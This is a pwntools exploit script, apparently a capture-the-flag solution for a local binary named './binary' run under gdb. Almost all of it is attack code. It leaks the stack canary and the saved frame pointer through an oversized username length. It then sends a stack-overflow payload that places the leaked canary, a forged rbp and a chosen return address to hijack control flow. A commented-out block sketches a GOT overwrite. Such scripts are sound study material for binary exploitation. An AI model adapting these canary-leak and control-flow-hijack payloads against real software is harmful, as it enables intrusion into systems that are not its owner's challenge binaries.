from pwn import *

#p = process("./binary")
p = gdb.debug("./binary", """
b *0x04013AC
b *0x04012E4
""")
context.log_level="debug"
context.arch = "amd64"
loop = 0x4014E6
main = 0x4013D8
reg = 0x40126B
login=0x401310
dup_plt = 0x404118
fputs = 0x401478
#leak canary
p.sendlineafter("> ",b'2')
p.sendlineafter("How long is your username: ",str(100))
p.sendlineafter("Username: ",b'a' * 16)
canary = p.recv(0x3b)
canary = u64(p.recv(0x7).rjust(8,b'\x00'))
main_rbp = u64(p.recv(0x8).rjust(8,b'\x00'))
success("canary: " + hex(canary))
success("main rbp: " + hex(main_rbp))
#control rbp
p.sendlineafter("> ",b'1')
p.sendlineafter("Username: ",b'a' * 16)
payload = b'a' * 0x18 + p64(canary) + p64(0x404050) + p64(reg)
p.sendlineafter("Password: ",payload)





'''
# overwirte got
payload1 = p64(dup_plt) + p64(dup_plt) +p64(dup_plt) + p64(canary) + p64(0x404050) + p64(0x13d8)

p.sendlineafter("Username: ",payload1)

p.sendlineafter("Password: ",payload1)
'''



p.interactive()



